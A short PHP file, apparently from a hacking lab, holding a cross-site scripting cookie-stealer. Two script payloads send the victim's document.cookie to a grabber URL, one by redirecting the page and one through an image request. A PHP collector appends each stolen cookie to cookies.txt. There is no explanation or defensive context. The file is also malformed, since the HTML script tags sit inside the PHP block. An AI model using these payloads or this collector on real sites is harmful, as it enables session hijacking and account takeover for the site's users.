<?php
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>

$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);

?>
